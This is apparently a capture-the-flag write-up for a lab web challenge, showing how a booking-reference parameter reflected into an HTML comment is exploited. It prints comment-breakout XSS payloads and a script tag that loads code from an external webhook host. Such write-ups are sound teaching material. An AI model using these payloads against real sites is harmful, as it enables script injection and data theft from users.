---
title: " Webverselabs Challenge Fermata Reflected XSS  "
date: 2026-05-14 00:00:00 +0000
categories: [Webverselabs]
tags: [Webverselabs , Medium , Challenge , Web_Attacks ]
---


# Scenario : 

Fermata connects clients with piano tuners. An old debug line left over from development drops the booking reference into an HTML comment so ops can scan View Source for bad IDs. It never occurred to anyone that comments are just text — not a fence.


# Solution :

First let's enumerate the application normally . 

<img width="1641" height="909" alt="image" src="https://github.com/user-attachments/assets/d736be5c-3142-4ba3-991a-28239aea7441" />


First endpoint we find is the /tuners endpoint which doesn't return anything useful .  


<img width="1725" height="964" alt="image" src="https://github.com/user-attachments/assets/5c2815d5-c254-4fc8-88b8-7da13094b448" />


Posts as well doesn't have anything of use to us : 


<img width="1823" height="913" alt="image" src="https://github.com/user-attachments/assets/a23a8354-359b-43e0-a49d-7c28830deeca" />


Now let's try to book a session , i will send the request then modify it with Burp . 


<img width="982" height="801" alt="image" src="https://github.com/user-attachments/assets/773fd405-abf0-47a4-b4e2-edddcb795f5f" />


I tried multiple XSS payloads , but all of themlead to this redirection : 


<img width="1510" height="709" alt="image" src="https://github.com/user-attachments/assets/20449f06-7325-4550-9e58-4d6504274cef" />


I even tried to get a call back to my WebHook Url but i got nothing . 


<img width="1041" height="705" alt="image" src="https://github.com/user-attachments/assets/5a7c682d-52bd-407d-aa7d-2795506b867a" />


let's follow the redirection , which is a GET request made to  /book?ref=FM-2026.... 



<img width="1452" height="734" alt="image" src="https://github.com/user-attachments/assets/3f578fc0-0cfa-42a9-b915-c56e7a528856" />


Now i tried some XSS payloads , used XSStrike but couldnt get the payload to execute , whatever we input in the parameter field gets rendered back to us as a comment . 



<img width="1441" height="713" alt="image" src="https://github.com/user-attachments/assets/2d860d68-f33a-497a-b7dc-9ea17a1e00ea" />


If we read the source code , we see that whatever we type gets added to an HTML comment . 


<img width="987" height="732" alt="image" src="https://github.com/user-attachments/assets/eb25dd53-1d29-4907-b9fa-a41072c2ab25" />



Let's try to break out of the HTML comment before we execute our payload to see if it works . 


```bash
<!-- debug:booking-ref <img src=x onerror=alert(1)> --> : Now if we add --> , it should break out of the HTML comment . 
<!-- debug:booking-ref--> <img src=x onerror=alert(1)> -->

==>  Now let's try to get a callback to our Webhook url .

--> <script src=https://webhook.site/26940115-08b9-440e-8ac8-3bbaaa7a></script>   

```

<img width="1563" height="817" alt="image" src="https://github.com/user-attachments/assets/c592b721-ca2d-47d3-b052-84b89c858a98" />



Now if we check out WebHook Site , we see that we get our Callback which means the payload was executed . 



<img width="1581" height="816" alt="image" src="https://github.com/user-attachments/assets/cee19af7-2259-4656-ab98-834a44b3280f" />



Once we get our XSS to work we should automatically get the flag . 


<img width="1231" height="446" alt="image" src="https://github.com/user-attachments/assets/6a9871ff-f7ac-4590-81ac-3534348c87a1" />


That's it for this challenge . 
